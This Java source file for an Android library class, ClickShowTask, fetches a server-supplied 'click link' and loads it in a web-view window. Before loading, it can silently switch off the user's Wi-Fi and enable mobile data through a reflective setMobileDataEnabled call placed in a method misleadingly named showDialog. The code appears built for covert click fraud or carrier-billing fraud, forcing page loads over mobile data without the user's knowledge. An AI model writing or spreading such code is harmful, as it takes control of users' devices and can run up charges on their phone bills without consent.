package com.oom.tblib.tasks;

import android.content.Context;
import android.os.AsyncTask;
import android.os.Handler;

import com.oom.tblib.mode.Ma;
import com.oom.tblib.utils.DataUtil;
import com.oom.tblib.utils.JsUtil;
import com.oom.tblib.utils.NotProguard;
import com.oom.tblib.utils.PhoneOperateUtil;
import com.oom.tblib.view.WebViewWindow;


/**
 * Created by xlc on 2017/5/24.
 */
@NotProguard
public class ClickShowTask extends AsyncTask<Void, Integer, Ma> {
    private Context mContext;

    private boolean checkTimes;

    private Handler handler;

    private WebViewWindow web;

    /**
     * @param context
     * @param check
     */
    public ClickShowTask(Context context, boolean check) {

        this.mContext = context;

        this.checkTimes = check;

        web = WebViewWindow.getInstance(context);

        handler = new Handler();

    }

    @Override
    protected Ma doInBackground(Void... params) {
        return DataUtil.getNextClickLink(mContext);
    }

    @Override
    protected void onPostExecute(final Ma s) {
        super.onPostExecute(s);
        if (s == null) {
            //                        Ulog.w("onPostExecute: 没有数据或不满足执行条件");
            //                        Ulog.show("onPostExecute: no data");
            return;
        }
        final int net_status = s.getAllow_network();

        switch (net_status) {
            case 1:

                if (PhoneOperateUtil.getWifiStatus(mContext)) {

                    //                                        Ulog.w("SplashActivity onPostExecute: 判断wifi为开启状态 做关闭");
                    //                                        Ulog.show("SplashActivity onPostExecute: close wifi");

                    if (JsUtil.getInstance(mContext).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_DOING) {
                        //                                                Ulog.show("js downloading ，no close wifi");

                        return;
                    }
                    //关闭wifi
                    PhoneOperateUtil.closeWifi(mContext);
                }
                //                                Ulog.show("SplashActivity onPostExecute: only wifi");

                if (PhoneOperateUtil.getMobileStatus(mContext, null)) {

                    //                                        Ulog.w("SplashActivity onPostExecute:GPRS为开启状态，不做开启操作");
                } else {
                    //                                        Ulog.show("SplashActivity onPostExecute:open gprs");
                    //                                        Ulog.w("SplashActivity onPostExecute:open gprs");
                    showDialog();

                }

                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        //                                                Ulog.w("开始执行webView跳转");
                        web.startLoad(s);
                    }
                }, 5000);

                break;
            default:
                web.startLoad(s);
        }
    }

    private void showDialog() {
        PhoneOperateUtil.setNetState(mContext, "setMobileDataEnabled", true);
    }
}